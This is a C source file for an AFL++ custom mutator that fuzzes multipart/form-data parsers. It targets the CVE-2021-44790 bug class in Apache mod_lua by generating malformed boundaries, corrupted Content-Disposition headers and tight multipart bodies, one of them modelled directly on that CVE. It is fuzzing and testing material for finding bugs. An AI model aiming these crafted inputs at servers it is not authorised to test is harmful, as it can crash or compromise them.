/*
 * Multipart Boundary Attack Mutator for AFL++
 *
 * Targets multipart/form-data parsing - the attack surface behind
 * CVE-2021-44790 and similar bugs in Apache mod_lua's req_parsebody.
 *
 * Strategies:
 * - Manipulate boundary strings (add/remove dashes, corrupt)
 * - Create tight spacing between part headers and next boundary
 * - Add/remove/reorder multipart parts
 * - Corrupt Content-Disposition headers
 * - Inject boundary-like sequences inside part values
 * - Generate minimal multipart bodies from scratch
 *
 * Compile:
 *   clang -shared -fPIC -O3 -o multipart_mutator.so multipart_mutator.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

typedef struct afl_state {
    void *afl;
} afl_state_t;

typedef struct my_mutator {
    afl_state_t *afl;
    unsigned int seed;
} my_mutator_t;

#define MAX_BUF (1024 * 1024)
static uint8_t tmp_buf[MAX_BUF];

/* Short boundaries that stress parsers */
static const char *boundaries[] = {
    "a", "ab", "x", "--", "boundary", "fuzzboundary",
    "AAAA", "----", "0", "\r\n"
};
static const int num_boundaries = 10;

static const char *field_names[] = {
    "name", "file", "data", "upload", "content", "field",
    "pew", "test", "x", "input"
};
static const int num_fields = 10;

static const char *dispositions[] = {
    "form-data",
    "attachment",
    "inline",
    "",
    "form-data; name=\"test\"; filename=\"x.txt\"",
    "form-data; name=\"a\"",
};
static const int num_dispositions = 6;

void *afl_custom_init(afl_state_t *afl, unsigned int seed)
{
    my_mutator_t *data = calloc(1, sizeof(my_mutator_t));
    if (!data)
        return NULL;
    data->afl = afl;
    data->seed = seed;
    srand(seed);
    return data;
}

void afl_custom_deinit(void *data)
{
    free(data);
}

/* Find \r\n\r\n boundary between headers and body */
static size_t find_headers_end(const uint8_t *buf, size_t buf_size)
{
    if (buf_size < 4)
        return 0;
    for (size_t i = 0; i <= buf_size - 4; i++) {
        if (buf[i] == '\r' && buf[i + 1] == '\n' &&
            buf[i + 2] == '\r' && buf[i + 3] == '\n') {
            return i;
        }
    }
    return 0;
}

/* Find "boundary=" in Content-Type header, return pointer to value */
static const uint8_t *find_boundary_value(const uint8_t *buf, size_t hend, size_t *blen)
{
    const char *needle = "boundary=";
    size_t nlen = strlen(needle);

    for (size_t i = 0; i + nlen < hend; i++) {
        if (strncasecmp((const char *)buf + i, needle, nlen) == 0) {
            size_t start = i + nlen;
            size_t end = start;
            while (end < hend && buf[end] != '\r' && buf[end] != ';' && buf[end] != ' ')
                end++;
            *blen = end - start;
            return buf + start;
        }
    }
    *blen = 0;
    return NULL;
}

/* Strategy 1: Replace boundary with a short/tricky one */
static size_t swap_boundary(const uint8_t *buf, size_t buf_size,
                            uint8_t *out, size_t max_size)
{
    size_t hend = find_headers_end(buf, buf_size);
    if (hend == 0)
        return 0;

    size_t old_blen;
    const uint8_t *old_bval = find_boundary_value(buf, hend, &old_blen);
    if (!old_bval || old_blen == 0)
        return 0;

    const char *new_boundary = boundaries[rand() % num_boundaries];
    size_t new_blen = strlen(new_boundary);

    /* Replace all occurrences of old boundary with new one */
    size_t pos = 0;
    size_t out_pos = 0;

    while (pos < buf_size && out_pos < max_size) {
        /* Check if old boundary starts here */
        if (pos + old_blen <= buf_size &&
            memcmp(buf + pos, old_bval, old_blen) == 0) {
            if (out_pos + new_blen > max_size)
                return 0;
            memcpy(out + out_pos, new_boundary, new_blen);
            out_pos += new_blen;
            pos += old_blen;
        } else {
            out[out_pos++] = buf[pos++];
        }
    }

    return out_pos;
}

/* Strategy 2: Generate a minimal multipart body with tight spacing
 * This targets the CVE-2021-44790 pattern where end - crlf < 8 */
static size_t generate_tight_multipart(const uint8_t *buf, size_t buf_size,
                                       uint8_t *out, size_t max_size)
{
    size_t hend = find_headers_end(buf, buf_size);
    if (hend == 0)
        return 0;

    /* Pick a short boundary */
    const char *b = boundaries[rand() % 3]; /* prefer single-char */
    size_t blen = strlen(b);

    /* Build Content-Type header */
    char ct_hdr[128];
    int ct_len = snprintf(ct_hdr, sizeof(ct_hdr),
                          "Content-Type: multipart/form-data; boundary=%s\r\n", b);
    if (ct_len <= 0)
        return 0;

    /* Check if there's already a Content-Type - find and remove it */
    /* For simplicity, just replace everything after request line */
    size_t rl_end = 0;
    for (size_t i = 0; i < hend - 1; i++) {
        if (buf[i] == '\r' && buf[i + 1] == '\n') {
            rl_end = i + 2;
            break;
        }
    }
    if (rl_end == 0)
        return 0;

    /* Build tight multipart body - minimal bytes between part headers and boundary */
    char body[512];
    int bpos = 0;
    int variant = rand() % 4;

    if (variant == 0) {
        /* CVE-2021-44790 variant: boundary char appears in Content-Disposition */
        bpos = snprintf(body, sizeof(body),
                        "--%s\r\n"
                        "Content-Disposition: form-data; name=\"pew\"\r\n"
                        "%s\r\n"
                        "\r\n"
                        "--%s--\r\n",
                        b, b, b);
    } else if (variant == 1) {
        /* Two parts, empty bodies, tight boundaries */
        bpos = snprintf(body, sizeof(body),
                        "--%s\r\n"
                        "\r\n"
                        "\r\n"
                        "--%s\r\n"
                        "z\r\n"
                        "\r\n"
                        "---%s--\r\n"
                        "\r\n",
                        b, b, b);
    } else if (variant == 2) {
        /* Single part, no Content-Disposition, minimal content */
        bpos = snprintf(body, sizeof(body),
                        "--%s\r\n"
                        "\r\n"
                        "x\r\n"
                        "--%s--\r\n",
                        b, b);
    } else {
        /* Three parts, some empty, varying dash counts */
        bpos = snprintf(body, sizeof(body),
                        "--%s\r\n"
                        "Content-Disposition: form-data; name=\"a\"\r\n"
                        "\r\n"
                        "\r\n"
                        "--%s\r\n"
                        "\r\n"
                        "\r\n"
                        "--%s\r\n"
                        "Content-Disposition: form-data; name=\"b\"\r\n"
                        "\r\n"
                        "v\r\n"
                        "--%s--\r\n",
                        b, b, b, b);
    }
    if (bpos <= 0)
        return 0;

    /* Content-Length for the body */
    char cl_hdr[64];
    int cl_len = snprintf(cl_hdr, sizeof(cl_hdr), "Content-Length: %d\r\n", bpos);
    if (cl_len <= 0)
        return 0;

    /* Assemble: request line + Host + Content-Type + Content-Length + \r\n + body */
    size_t total = rl_end + 16 + ct_len + cl_len + 2 + bpos; /* 16 for Host header */
    if (total > max_size)
        return 0;

    size_t opos = 0;
    memcpy(out + opos, buf, rl_end);
    opos += rl_end;
    memcpy(out + opos, "Host: localhost\r\n", 17);
    opos += 17;
    memcpy(out + opos, ct_hdr, ct_len);
    opos += ct_len;
    memcpy(out + opos, cl_hdr, cl_len);
    opos += cl_len;
    out[opos++] = '\r';
    out[opos++] = '\n';
    memcpy(out + opos, body, bpos);
    opos += bpos;

    return opos;
}

/* Strategy 3: Add extra dashes to boundary markers in body */
static size_t mutate_boundary_dashes(const uint8_t *buf, size_t buf_size,
                                     uint8_t *out, size_t max_size)
{
    size_t hend = find_headers_end(buf, buf_size);
    if (hend == 0)
        return 0;

    /* Copy headers as-is */
    size_t body_start = hend + 4;
    if (body_start >= buf_size)
        return 0;

    memcpy(out, buf, body_start);
    size_t opos = body_start;

    /* In the body, randomly add/remove dashes before boundary-like sequences */
    for (size_t i = body_start; i < buf_size && opos < max_size; i++) {
        if (buf[i] == '-' && i + 1 < buf_size && buf[i + 1] == '-') {
            /* Found "--", randomly add 1-3 extra dashes */
            int extra = rand() % 4;
            for (int j = 0; j < extra && opos < max_size; j++)
                out[opos++] = '-';
        }
        if (opos < max_size)
            out[opos++] = buf[i];
    }

    return opos;
}

/* Strategy 4: Corrupt Content-Disposition in a multipart part */
static size_t corrupt_disposition(const uint8_t *buf, size_t buf_size,
                                  uint8_t *out, size_t max_size)
{
    /* Find "Content-Disposition:" in the body area */
    size_t hend = find_headers_end(buf, buf_size);
    if (hend == 0)
        return 0;

    size_t body_start = hend + 4;
    const char *needle = "Content-Disposition:";
    size_t nlen = strlen(needle);
    size_t dpos = 0;
    int found = 0;

    for (size_t i = body_start; i + nlen < buf_size; i++) {
        if (strncasecmp((const char *)buf + i, needle, nlen) == 0) {
            dpos = i;
            found = 1;
            break;
        }
    }

    if (!found)
        return 0;

    /* Find end of this disposition line */
    size_t line_end = dpos + nlen;
    while (line_end < buf_size - 1 && !(buf[line_end] == '\r' && buf[line_end + 1] == '\n'))
        line_end++;

    /* Replace with a random disposition */
    const char *new_disp = dispositions[rand() % num_dispositions];
    char line[256];
    int llen = snprintf(line, sizeof(line), "Content-Disposition: %s", new_disp);
    if (llen <= 0)
        return 0;

    size_t suffix_len = buf_size - line_end;
    if (dpos + llen + suffix_len > max_size)
        return 0;

    memcpy(out, buf, dpos);
    memcpy(out + dpos, line, llen);
    memcpy(out + dpos + llen, buf + line_end, suffix_len);
    return dpos + llen + suffix_len;
}

/* Strategy 5: Inject a boundary-like sequence inside a part value */
static size_t inject_fake_boundary(const uint8_t *buf, size_t buf_size,
                                   uint8_t *out, size_t max_size)
{
    size_t hend = find_headers_end(buf, buf_size);
    if (hend == 0)
        return 0;

    size_t body_start = hend + 4;
    if (body_start >= buf_size)
        return 0;

    size_t old_blen;
    const uint8_t *bval = find_boundary_value(buf, hend, &old_blen);
    if (!bval || old_blen == 0)
        return 0;

    /* Find a random position in the body to inject a fake boundary line */
    size_t body_len = buf_size - body_start;
    if (body_len < 4)
        return 0;

    size_t inject_pos = body_start + rand() % body_len;

    /* Build fake boundary: \r\n--<boundary>\r\n with possible extra dashes */
    char fake[128];
    int extra_dashes = rand() % 3;
    int flen = 0;
    fake[flen++] = '\r';
    fake[flen++] = '\n';
    fake[flen++] = '-';
    fake[flen++] = '-';
    for (int i = 0; i < extra_dashes; i++)
        fake[flen++] = '-';
    if (flen + (int)old_blen + 2 < (int)sizeof(fake)) {
        memcpy(fake + flen, bval, old_blen);
        flen += old_blen;
    }
    fake[flen++] = '\r';
    fake[flen++] = '\n';

    size_t suffix_len = buf_size - inject_pos;
    if (inject_pos + flen + suffix_len > max_size)
        return 0;

    memcpy(out, buf, inject_pos);
    memcpy(out + inject_pos, fake, flen);
    memcpy(out + inject_pos + flen, buf + inject_pos, suffix_len);
    return inject_pos + flen + suffix_len;
}

size_t afl_custom_fuzz(
    void *data, uint8_t *buf, size_t buf_size, uint8_t **out_buf,
    uint8_t *add_buf, size_t add_buf_size, size_t max_size
)
{
    *out_buf = tmp_buf;

    if (max_size > MAX_BUF)
        max_size = MAX_BUF;

    int strategy = rand() % 100;
    size_t new_size = 0;

    if (strategy < 25) {
        new_size = generate_tight_multipart(buf, buf_size, tmp_buf, max_size);
    } else if (strategy < 45) {
        new_size = swap_boundary(buf, buf_size, tmp_buf, max_size);
    } else if (strategy < 60) {
        new_size = mutate_boundary_dashes(buf, buf_size, tmp_buf, max_size);
    } else if (strategy < 75) {
        new_size = corrupt_disposition(buf, buf_size, tmp_buf, max_size);
    } else {
        new_size = inject_fake_boundary(buf, buf_size, tmp_buf, max_size);
    }

    if (new_size == 0 || new_size > max_size) {
        size_t sz = buf_size < max_size ? buf_size : max_size;
        memcpy(tmp_buf, buf, sz);
        new_size = sz;
    }

    return new_size;
}

size_t afl_custom_fuzz_count(void *data, const uint8_t *buf, size_t buf_size)
{
    return 10;
}
